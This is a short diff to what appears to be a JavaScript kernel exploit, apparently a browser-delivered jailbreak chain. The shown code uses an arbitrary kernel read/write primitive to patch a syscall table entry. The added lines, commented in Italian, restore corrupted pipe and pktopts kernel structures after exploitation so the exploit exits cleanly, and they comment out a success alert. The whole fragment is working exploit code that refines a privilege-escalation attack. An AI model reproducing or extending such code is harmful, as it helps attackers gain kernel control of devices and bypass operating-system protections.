@@ -1476,6 +1476,14 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
     kmem.write32(worker_sock, kmem.read32(worker_sock) + 1);
     // +2 since we have to take into account the fget_write()'s reference
     kmem.write32(pipe_file.add(0x28), kmem.read32(pipe_file.add(0x28)) + 2);*/
+	
+	
+
+    // RIPRISTINO STRUTTURE PIPE
+    kmem.write64(kpipe, pipe_save.read64(0));
+    kmem.write64(kpipe.add(8), pipe_save.read64(8));
+    kmem.write64(kpipe.add(0x10), pipe_save.read64(0x10));
+    log('pipe structure restored');
     
     return [kbase, kmem, p_ucred, [kpipe, pipe_save, pktinfo_p, w_pktinfo]];
 }
@@ -1603,7 +1611,20 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     kmem.write64(sysent_661.add(8), sy_call);
     // .sy_thrcnt = SY_THR_STATIC
     kmem.write32(sysent_661.add(0x2c), sy_thrcnt);
-    alert("kernel exploit succeeded!");
+	
+	  // RIPRISTINO COMPLETO PRIMA DI USCIRE
+    const [kpipe, pipe_save, pktinfo_p, w_pktinfo] = restore_info;
+    
+    // Ripristino struttura pipe originale
+    for (let off = 0; off < pipe_save.size; off += 8) {
+        kmem.write64(kpipe.add(off), pipe_save.read64(off));
+    }
+    
+    // Ripristino puntatori pktopts
+    kmem.write64(pktinfo_p, 0);
+    kmem.write64(w_pktinfo, 0);
+    log('kernel structures fully restored');
+    //alert("kernel exploit succeeded!");
 }
 
 
